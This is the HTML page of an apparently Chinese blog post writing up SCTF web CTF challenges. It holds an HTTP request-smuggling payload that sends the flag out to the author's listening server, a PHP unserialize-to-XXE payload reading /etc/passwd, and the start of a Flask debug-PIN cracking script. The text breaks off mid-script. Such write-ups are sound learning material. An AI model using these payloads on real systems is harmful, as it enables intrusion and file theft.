@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="CTF,Java,Web,JavaScript,Linux">
+    <meta name="description" content="记录一些奇奇怪怪乱七八糟的东西">
+    <meta name="author" content="y1zh3e7">
+    
+    <title>
+        
+            SCTF-Web复现 |
+        
+        y1’s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.jpg","favicon":"/images/logo.jpg","avatar":"/images/avatar.jpg","font_size":"21px","font_family":"STHeiti","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/cover.jpg","description":"一只坐牢的web🐶 || 懂进攻知防守，先正向后逆向","font_color":"#FFFFFF","hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI","appkey":"7gIuYJ9YQk94en6wRudankYd","server_urls":"https://ycemvr5n.api.lncldglobal.com","placeholder":"Hi speak something！"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"center","copyright_info":false},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.0.0-rc1">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               y1’s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">SCTF-Web复现</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">y1zh3e7</span>
+                            
+                                <span class="author-label">Lv2</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-06-25 22:19:14</span>
+        <span class="mobile">2023-06-25 22:19</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-06-25 22:21:14</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/SCTF/">SCTF</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3.1k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>14 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h1 id="SCTF-Web复现"><a href="#SCTF-Web复现" class="headerlink" title="SCTF-Web复现"></a>SCTF-Web复现</h1><h2 id="ezcheck1n"><a href="#ezcheck1n" class="headerlink" title="ezcheck1n"></a>ezcheck1n</h2><p>赛题评价：这不好说，很难评</p>
+<p>题目代码逻辑如下，主要逻辑是从参数中获取url参数，然后把flag变量拼接到url后面，之后发过去，其实就是个外带回显</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="string">"flag{fake_flag}"</span>;</span><br><span class="line">@<span class="title function_ invoke__">file_get_contents</span>(<span class="string">"http://"</span>.<span class="variable">$_GET</span>[<span class="string">'url'</span>].<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="comment"># but it's not the real flag</span></span><br><span class="line"><span class="comment"># beacuse someone say this year is not 2023 !!! like the post?</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">'./2023.php'</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">'./post.jpeg'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="data:image/jpeg;base64,'</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>) . <span class="string">'"&gt;'</span>;</span><br><span class="line"><span class="comment"># notice -&gt; time</span></span><br><span class="line"><span class="comment"># How should you get to where the flag is, the middleware will not forward requests that are not 2023</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>尝试一下：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624144319581.png"></p>
+<figure class="highlight tex"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@VM-24-4-ubuntu:~<span class="params">#</span> nc -lvnp 7777</span><br><span class="line">Listening on 0.0.0.0 7777</span><br><span class="line">Connection received on 115.239.215.75 54096</span><br><span class="line">GET /flag{fake<span class="built_in">_</span>flag} HTTP/1.0</span><br><span class="line">Host: 43.143.246.73:7777</span><br><span class="line">Connection: close</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里有两个地方很奇怪，一个是传参的时候，用<code>?url=xxxx:xxxx/</code>这种形式传递是不行的，还有就是我并没有在2023.php下进行参数传递也可以通，其实这两个问题都是一个原因，就是apache的Rewrite规则，相信如果了解过apache-Rewrite的师傅肯定不陌生，它采用的是正则匹配的方式，随便一猜也可以猜的出来匹配的是/2023/（正则内容），然后将正则内容作为参数转交给其他逻辑（2023.php）处理。所以此时我们可以理解成在url前面已经有一个默认的参数了，就不能用?进行传参，而是用&amp;拼接第二个参数，所以其实这样传也是可以的（这里我可能理解的不够深，如果有师傅有其他理解也吗麻烦指正一下）：<br><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624144805079.png"></p>
+<p>然后f12在相应header中可以看到apache的版本是2.5.4，这个版本的apche存在走私漏洞，说白了就是可以在一次请求中发送多个数据包请求，参考文章如下：<a class="link" target="_blank" rel="noopener" href="https://forum.butian.net/share/2180%EF%BC%9A">https://forum.butian.net/share/2180：<i class="fas fa-external-link-alt"></i></a><br><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624145004531.png"></p>
+<p>然后就到了这道题最抽象的地方，就是对出题人的脑洞，这些提示其实就是告诉我们中间件能解析的请求是2023的，但是真正的flag却不在2023中，谜语翻译过来就是要用走私构造一个2023的数据包来绕过中间件，然后再构造一个访问2022.php的数据包拿到flag：</p>
+<figure class="highlight tex"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">#</span> but it's not the real flag</span><br><span class="line"><span class="params">#</span> beacuse someone say this year is not 2023 !!! like the post?</span><br><span class="line">show<span class="built_in">_</span>source('./2023.php');</span><br><span class="line"><span class="params">#</span> notice -&gt; time</span><br><span class="line"><span class="params">#</span> How should you get to where the flag is, the middleware will not forward requests that are not 2023</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后这里赛后又复现了一遍，貌似是环境寄了，拿当时比赛时打通的payload和各种其他师傅的payload全是超时，数据包大概就这么构造：</p>
+<p>burp随便抓个包存到pre.txt中，然后写个脚本把里面空格替换成%20，换行替换成%0d%0a：</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">httptext = <span class="string">""</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">'pre.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line"><span class="comment">#### 读取文件内容，将每一行中的空格替换为%20 ####</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    line = line.replace(<span class="string">' '</span>, <span class="string">'%20'</span>)</span><br><span class="line">    <span class="comment"># print(line)</span></span><br><span class="line">    <span class="comment">#### 将每一行的\n替换为%0d%0a ####</span></span><br><span class="line">    <span class="comment">#### 并存储到httptext中 ####</span></span><br><span class="line">    httptext = httptext + line.replace(<span class="string">'\n'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">f.close()</span><br><span class="line">httptext = httptext + <span class="string">""</span></span><br><span class="line"><span class="built_in">print</span>(httptext)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>之后再构造出第二个数据包就行了，然后第二个数据包访问的路由和参数是<code>2022.php?url=vpsip:port/</code>，然后两个数据包之间用%0d%0a%0d%0a进行拼接就可以了，最后构造好的包文是这样的（比赛时打通的）：</p>
+<figure class="highlight tex"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /2023/<span class="comment">%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/2022.php%3furl%3d43.143.246.73%3a7777 HTTP/1.1</span></span><br><span class="line">Host: 115.239.215.75:8082</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://115.239.215.75:8082/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624153802426.png"></p>
+<h2 id="pypyp"><a href="#pypyp" class="headerlink" title="pypyp?"></a>pypyp?</h2><p>赛题评价：同上一题（提示app.py是干嘛的）</p>
+<p>先来点小脑洞，进入环境之后说没有Session，这里是php的Session，可能很多人会误解成Python的Session，然后可以利用PHP_SESSION_UPLOAD_PROGRESS在客户端强行创建一个Session，并且<code>session.upload_progress.name</code>这个属性（Session全局数组中的key）是可控的，我们可以通过POST一个恶意的PHP_SESSION_UPLOAD_PROGRESS字段，并且这个字段的Value就是这个<code>session.upload_progress.name</code>。</p>
+<blockquote>
+<p>Session Upload Progress 最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在Session中，此时即使用户没有初始化Session，PHP也会自动初始化Session。而且，默认情况下session.upload_progress.enabled是为On的，也就是说这个特性默认开启。所以，我们可以通过这个特性来在目标主机上初始化Session。</p>
+</blockquote>
+<p>从上面官方给出的定义中可以知道PHP_SESSION_UPLOAD_PROGRESS是一个用来统计文件上传进度的Session，所以我们可以写一个表单，POST一个PHP_SESSION_UPLOAD_PROGRESS字段，并加入一个文件上传，就可以获取到伪造的表单提交包文了：</p>
+<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://xxxxx/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>上传文件并抓包可以拿到这样的包文：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624213220127.png"></p>
+<p>改造题目环境的包文，绕过第一关：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624213300251.png"></p>
+<p>拿到题目源码如下：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)){</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Session not started'</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$type</span> = <span class="variable">$_SESSION</span>[<span class="string">'type'</span>];</span><br><span class="line">    <span class="variable">$properties</span> = <span class="variable">$_SESSION</span>[<span class="string">'properties'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$_POST</span>[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">'data'</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$properties</span>)&amp;&amp;<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>))){</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>));</span><br><span class="line">    <span class="variable">$object</span> -&gt; <span class="title function_ invoke__">sctf</span>();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$properties</span>)){</span><br><span class="line">        <span class="variable">$object</span> = <span class="keyword">new</span> <span class="variable">$type</span>(<span class="variable">$properties</span>[<span class="number">0</span>],<span class="variable">$properties</span>[<span class="number">1</span>]);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">'http://127.0.0.1:5000/'</span>.<span class="variable">$properties</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"this is the object: <span class="subst">$object</span> &lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>先看第一部分，有个变量覆盖<code>  extract(unserialize($_POST['data']));</code>，也就是说我们可以通过传入一个数组来覆盖上面$type和$properties的值，再往下看发现有一个判断：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$properties</span>)){</span><br><span class="line">        <span class="variable">$object</span> = <span class="keyword">new</span> <span class="variable">$type</span>(<span class="variable">$properties</span>[<span class="number">0</span>],<span class="variable">$properties</span>[<span class="number">1</span>]);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果$properties是一个数组，就new一个$type对象，并且传入参数为<code>$properties[0],$properties[1]</code>，那么我们可以让$type为<code>SimpleXMLElement</code>这个原生类，这个原生类可以解析一个XML文档，并且初始化时参数如下，需要注意的是第三个参数<code>data_is_url</code>，默认为false，也就是第一个参数data需要传入一个xml：<br><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624222702721.png"></p>
+<p>这样的话我们就可以构造出一个payload，从而实现XXE，这样我们就实现了任意文件读取：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pro</span> = <span class="keyword">array</span>(<span class="string">'&lt;?xml version="1.0" ?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;'</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">"properties"</span>=&gt;<span class="variable">$pro</span>,<span class="string">"type"</span>=&gt;SimpleXMLElement);</span><br><span class="line"><span class="comment">// print_r($arr);</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624224532021.png"></p>
+<p>再看else的部分，如果$properties不是数组，就会访问远程的一个服务，题目提示了/app/app.py，我们这里xxe看一下代码：    </p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$properties</span>)){</span><br><span class="line">        <span class="variable">$object</span> = <span class="keyword">new</span> <span class="variable">$type</span>(<span class="variable">$properties</span>[<span class="number">0</span>],<span class="variable">$properties</span>[<span class="number">1</span>]);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">'http://127.0.0.1:5000/'</span>.<span class="variable">$properties</span>);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现Flask服务开启了debug，算pin码就可以了：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624230721367.png"></p>
+<p>放个算pin码的脚本，还能顺带算出cookie，方便后面直接用：</p>
+<p>项目地址：<a class="link" target="_blank" rel="noopener" href="https://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code/blob/main/get_flask_pin_and_cookie.py">https://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code/blob/main/get_flask_pin_and_cookie.py<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Tested on Python3.8</span></span><br><span class="line"><span class="comment"># This script generates a Cookie based on a legitimate PIN code.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If you are using a Python version lower than 3.8 and you were unable to generate a Cookie or PIN, use the script at the link below.</span></span><br><span class="line"><span class="comment"># It is based on the following script, which generates only the PIN code:</span></span><br><span class="line"><span class="comment"># https://gist.githubusercontent.com/InfoSecJack/70033ecb7dde4195661a1f6ed7990d42/raw/028384ef695e376d412f9276ad27b2c916d4f748/get_flask_pin.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In different versions of python, the hashing algorithm may differ, in this case, sha1 is used.</span></span><br><span class="line"><span class="comment"># There may also be other differences.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">text_type = <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 